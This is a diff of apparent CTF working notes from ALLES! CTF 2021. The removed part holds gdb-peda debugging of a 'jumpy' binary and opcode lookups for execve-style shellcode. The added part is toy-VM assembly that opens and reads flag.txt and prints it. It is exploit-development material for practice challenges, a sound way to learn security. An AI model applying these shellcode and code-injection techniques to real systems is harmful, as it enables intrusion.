@@ -1,106 +1,16 @@
-gdb-peda$ vmmap
-Start              End                Perm	Name
-0x0000001337000000 0x0000001337001000 r-xp	mapped
-0x0000555555554000 0x0000555555555000 r--p	/home/mito/CTF/ALLES!_CTF_2021/Pwn_Jumpy/jumpy
-0x0000555555555000 0x0000555555556000 r-xp	/home/mito/CTF/ALLES!_CTF_2021/Pwn_Jumpy/jumpy
-0x0000555555556000 0x0000555555557000 r--p	/home/mito/CTF/ALLES!_CTF_2021/Pwn_Jumpy/jumpy
-0x0000555555557000 0x0000555555558000 r--p	/home/mito/CTF/ALLES!_CTF_2021/Pwn_Jumpy/jumpy
-0x0000555555558000 0x0000555555559000 rw-p	/home/mito/CTF/ALLES!_CTF_2021/Pwn_Jumpy/jumpy
-0x0000555555559000 0x000055555557a000 rw-p	[heap]
-0x00007ffff79e2000 0x00007ffff7bc9000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
-0x00007ffff7bc9000 0x00007ffff7dc9000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
-0x00007ffff7dc9000 0x00007ffff7dcd000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
-0x00007ffff7dcd000 0x00007ffff7dcf000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
-0x00007ffff7dcf000 0x00007ffff7dd3000 rw-p	mapped
-0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
-0x00007ffff7fd5000 0x00007ffff7fd7000 rw-p	mapped
-0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
-0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
-0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
-0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
-0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
-0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
-0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+PUSH 0x7478742e
+PUSH 0x67616c66
+MOV R8, 3
+MOV R1, SP
+MOV R2, 0x500010
+MOV R3, 100
+SYSCALL
 
-gdb-peda$ x/80gx 0x0000001337000000
-0x1337000000:	0xc305eb00000101b8	0xc3c3c3c3c3c3c3c3
-0x1337000010:	0xc3c3c3c3c3c3c3c3	0xc3c3c3c3c3c3c3c3
+MOV R8, 1
+MOV R1, 0x500010
+MOV R2, 30
+SYSCALL
 
-
-[----------------------------------registers-----------------------------------]
-RAX: 0x0 
-RBX: 0x0 
-RCX: 0x1337000000 (mov    eax,0x101)
-RDX: 0x7ffff7dcf8c0 --> 0x0 
-RSI: 0x7fffffffb6e0 ("\nrunning your code...\nand useless assembler instead\n\n")
-RDI: 0x5 
-RBP: 0x7fffffffdde0 --> 0x555555555700 (<__libc_csu_init>:	endbr64)
-RSP: 0x7fffffffdd80 --> 0x5 
-RIP: 0x5555555556c0 (<main+736>:	call   rcx)
-R8 : 0x16 
-R9 : 0xfffffffffffffffe 
-R10: 0x3 
-R11: 0x206 
-R12: 0x5555555550e0 (<_start>:	endbr64)
-R13: 0x7fffffffdec0 --> 0x1 
-R14: 0x0 
-R15: 0x0
-EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-   0x5555555556b4 <main+724>:	call   0x555555555080 <alarm@plt>
-   0x5555555556b9 <main+729>:	mov    al,BYTE PTR [rbp-0x59]
-   0x5555555556bc <main+732>:	mov    rcx,QWORD PTR [rbp-0x50]
-=> 0x5555555556c0 <main+736>:	call   rcx
-   0x5555555556c2 <main+738>:	mov    rsi,rax
-   0x5555555556c5 <main+741>:	mov    al,BYTE PTR [rbp-0x59]
-   0x5555555556c8 <main+744>:	lea    rdi,[rip+0xa54]        # 0x555555556123
-   0x5555555556cf <main+751>:	call   0x555555555060 <printf@plt>
-No argument
-[------------------------------------stack-------------------------------------]
-0000| 0x7fffffffdd80 --> 0x5 
-0008| 0x7fffffffdd88 --> 0xebf7dd5660 
-0016| 0x7fffffffdd90 --> 0x1337000000 (mov    eax,0x101)
-0024| 0x7fffffffdd98 --> 0x100f0b5ff 
-0032| 0x7fffffffdda0 --> 0x133700000c (ret)
-0040| 0x7fffffffdda8 --> 0x50055555555574d 
-0048| 0x7fffffffddb0 --> 0x0 
-0056| 0x7fffffffddb8 --> 0x1 
-[------------------------------------------------------------------------------]
-
-> jmp 1
-> moveax 184
-> moveax 9461585
-
-gdb-peda$ x/80gx 0x0000001337000000
-0x1337000000:	0xb8000000b8b801eb	0xc3c3c3c300905f51
-0x1337000010:	0xc3c3c3c3c3c3c3c3	0xc3c3c3c3c3c3c3c3
-
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_ccanary$ asm -c amd64 "push rcx"
-51
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_ccanary$ asm -c amd64 "push rax"
-50
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_ccanary$ asm -c amd64 "push rsi"
-56
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_ccanary$ asm -c amd64 "pop rdi"
-5f
-
-
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_Jumpy$ asm -c amd64 "pop rsi"
-5e
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_Jumpy$ asm -c amd64 "pop rdx"
-5a
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_Jumpy$ asm -c amd64 "xor rax,rax"
-4831c0
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_Jumpy$ asm -c amd64 "add edi, 0x40"
-83c740
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_Jumpy$ asm -c amd64 "syscall"
-0f05
-xormito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_Jumpy$ asm -c amd64 "mov al, 0x3b"
-b03b
-
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_Jumpy$ asm -c amd64 "xor rsi,rsi"
-4831f6
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_Jumpy$ asm -c amd64 "push rsi"
-56
-mito@ubuntu:~/CTF/ALLES!_CTF_2021/Pwn_Jumpy$ asm -c amd64 "pop rdx"
-5a
+MOV R8, 2
+MOV R1, 0
+SYSCALL
